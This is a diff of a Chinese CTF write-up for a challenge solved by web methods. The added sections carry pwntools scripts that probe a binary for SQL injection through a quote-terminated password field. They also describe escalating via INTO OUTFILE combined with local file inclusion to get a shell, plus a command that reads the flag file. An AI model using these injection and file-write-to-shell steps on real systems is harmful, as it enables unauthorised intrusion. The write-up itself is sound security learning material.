@@ -11,6 +11,8 @@ categories:
 
 算是第一次做pwn题，不过有点不得不说，整个题目几乎都是web思路，除了分析bin的部分需要一点儿别的知识，其余都可以web直接做，下面稍微说下吧
 
+由于各种各样的原因吧，最后还是被取消了成绩，不想解释太多，下面的wp已经把之前没有写过的部分全部修改增加上了，整个思路除了使用别人的poc修改，全部都是自己的思路，从一个web选手的角度去思考而已...
+
 <!--more-->
 
 总览整个网站，存在任意文件包含漏洞，但是整个站都是假的，没有任何功能。
@@ -146,9 +148,102 @@ INSERT INTO TOKENS (TOKENS, PASSWORD) VALUES('%s', '%s')
 INSERT INTO BID (TOKENS, PRICE) VALUES('%s', '%d')
 ```
 
-关键是PASSWORD和PRICE都是可控值，但是PASSWORD输入为字符串，那么就存在注入，我们只要闭合insert,就可以执行任意语句。
+<del>关键是PASSWORD和PRICE都是可控值，但是PASSWORD输入为字符串，那么就存在注入，我们只要闭合insert,就可以执行任意语句。</del>
+
+由于做法和二进制思路不同，所以这里结论是错的，很抱歉给别人带来了误导，这里我重新解释我对这部分的处理思路。
+
+ida分析函数没什么收获，只知道bin的功能，和web页面中的功能相同，有注册和出价两个功能，help可以看到功能帮助。
+
+那么我觉得应该搭一个本地环境，稍微搭起来就可以测试了，如果这步不能理解，我想测试一下就可以知道了。在你一切都没有配置的情况下，运行程序，输入reg 123，会爆链接错误，但是可以看到用户，然后strings一下
+
+![image_1b4b8pauc117a19crdtp881429.png-5.4kB][1]
+
+后面也是一样，会爆表不存在，那么建表，紧接着会爆字段错误，可以直接跟着报错建表，也可以
+![image_1b4b8rnc814s0156ajbfte81hldm.png-9.9kB][2]
+
+表结构很清楚了，搭好了就是测试，主要就是两个功能，bid出价和注册，正常的逻辑都是先注册在出价，随便测试一下没什么收获
+```
+from pwn import *
+context.log_level = 'debug'
+
+R = process('./raft')
+#R = remote('54.223.241.254',22333)
+
+R.recvuntil('A date with Firesun is on sale!\n')
+q = '555asdf'
+
+R.send('reg '+q+'\n')
+R.recv()
+
+R.send('bid '+'233333'+'\n')
+R.recv()
+
+R.interactive()
+```
+
+反过来试试看
+```
+context.log_level = 'debug'
+
+R = process('./raft')
+#R = remote('54.223.241.254',22333)
+
+R.recvuntil('A date with Firesun is on sale!\n')
+q = '555asdf'
+
+R.send('bid '+q+'\n')
+R.recv()
+
+R.send('reg '+'233333'+'\n')
+R.recv()
+
+R.interactive()
+```
+
+这里一般来说会有两种结果，第一种是正常的。
+![image_1b4bmmlia1medbfg10g8f4k19lb2a.png-13.2kB][3]
+
+![image_1b4bmn0iq1k6p1tk917u41hmplll2n.png-12.6kB][4]
+TOKENS表中password被正常处理。
+
+另一种是发生了错误
+![image_1b4bm3d0dsa05tb12kn2pf13dj13.png-10.7kB][5]
+这种就是不返回token的，我们看看数据库
+![image_1b4bm9226mls1v269euegadg61g.png-17.9kB][6]
+在TOKENS表里直接写入了字符串，回想前面strings得到的语句。
+```
+INSERT INTO TOKENS (TOKENS, PASSWORD) VALUES('%s', '%s')
+INSERT INTO BID (TOKENS, PRICE) VALUES('%s', '%d')
+```
+
+这里我没想那么多，因为存在可控点为password和price两个，一个输入为%d，所以会发生截断，另一个输入为%s，猜测有注入点，测试一下。
+
+```
+from pwn import *
+context.log_level = 'debug'
+
+R = process('./raft')
+#R = remote('54.223.241.254',22333)
+
+R.recvuntil('A date with Firesun is on sale!\n')
+q = '555asdf\''
+
+R.send('bid '+q+'\n')
+R.recv()
+
+R.send('reg '+'233333'+'\n')
+R.recv()
+
+R.interactive()
+```
+
+![image_1b4bmfk1k1v79e2p1j6m2oguas1t.png-19.7kB][7]
+报错了，那么任意构造语句，仔细观察可以发现，在线上的web部分，还有返回值是数据库中的。
 
 讲道理到这里对于一个webU•ェ•*U就已经很简单了。
+
+对于一个注入点来说，对于一个正常的web选手来说，可显注，可显错注入（有报错），然后测试一下就发现，线上数据库权限非常高，可以随便写文件（into outfile），再加上有任意文件包含，那么就可以随便getshell...
+
 
 但是问题来了，服务端口在哪，苦寻无果，nmap一波
 
@@ -191,3 +286,12 @@ http://54.223.241.254/?page=/tmp/ddog3
 
 ddog=cat /home/ctf/this-is-real-flag000
 ```
+
+
+  [1]: http://static.zybuluo.com/LoRexxar/3mynkfeq39k3eohjz2wva98s/image_1b4b8pauc117a19crdtp881429.png
+  [2]: http://static.zybuluo.com/LoRexxar/rh6m1p9mjf19e6n3j59ot0xa/image_1b4b8rnc814s0156ajbfte81hldm.png
+  [3]: http://static.zybuluo.com/LoRexxar/1ha3vmag9gtx6e9ptlcecfkr/image_1b4bmmlia1medbfg10g8f4k19lb2a.png
+  [4]: http://static.zybuluo.com/LoRexxar/jn6usw0gx80qh5ykbxc047sv/image_1b4bmn0iq1k6p1tk917u41hmplll2n.png
+  [5]: http://static.zybuluo.com/LoRexxar/8n1tc1fgzkxpta6chyr7cf7u/image_1b4bm3d0dsa05tb12kn2pf13dj13.png
+  [6]: http://static.zybuluo.com/LoRexxar/dkwvpgccd2dzjtizdiyabf2w/image_1b4bm9226mls1v269euegadg61g.png
+  [7]: http://static.zybuluo.com/LoRexxar/q9svyk6depyg3ngjv6f2b3hw/image_1b4bmfk1k1v79e2p1j6m2oguas1t.png
